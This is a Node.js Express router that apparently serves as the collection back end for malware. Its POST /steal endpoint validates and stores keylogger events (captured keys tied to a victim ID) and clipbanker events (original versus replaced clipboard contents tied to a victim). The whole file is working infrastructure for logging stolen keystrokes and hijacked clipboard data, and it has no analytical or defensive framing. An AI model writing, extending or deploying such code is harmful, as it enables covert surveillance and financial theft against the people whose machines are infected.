const express = require('express');
const router = express.Router();

const { KeyloggerEvent, ClipbankerEvent } = require('../models/cred');

// Helper validation functions
function validateKeyloggerEvent(body) {
    return (
        body &&
        typeof body.type === 'string' &&
        body.type === 'keylogger' &&
        typeof body.key === 'string' &&
        typeof body.victim === 'string'
    );
}

function validateClipbankerEvent(body) {
    return (
        body &&
        typeof body.type === 'string' &&
        body.type === 'clipbanker' &&
        typeof body.original === 'string' &&
        typeof body.replaced === 'string' &&
        typeof body.victim === 'string'
    );
}

// POST /steal -- Accept both keylogger and clipbanker event posts
router.post('/steal', async (req, res) => {
    try {
        if (!req.body) {
            return res.status(400).json({ error: "Missing request body. Ensure express.json() middleware is used." });
        }

        const { type } = req.body;

        if (!type) {
            return res.status(400).json({ error: "Missing 'type' field (required: 'keylogger' or 'clipbanker')." });
        }

        let doc;
        if (type === 'keylogger') {
            if (!validateKeyloggerEvent(req.body)) {
                return res.status(400).json({ error: "Missing or invalid fields for keylogger event. Required: type='keylogger', key, victim." });
            }
            doc = new KeyloggerEvent(req.body);
        } else if (type === 'clipbanker') {
            if (!validateClipbankerEvent(req.body)) {
                return res.status(400).json({ error: "Missing or invalid fields for clipbanker event. Required: type='clipbanker', original, replaced, victim." });
            }
            doc = new ClipbankerEvent(req.body);
        } else {
            return res.status(400).json({ error: "Invalid event type. Must be 'keylogger' or 'clipbanker'." });
        }

        await doc.save();
        res.status(201).json({ success: true, message: `${type} event recorded.` });
    } catch (err) {
        // Log the error (consider logging to a file in production)
        console.error('Error saving event:', err);
        res.status(500).json({ error: 'Internal server error.' });
    }
});

module.exports = router;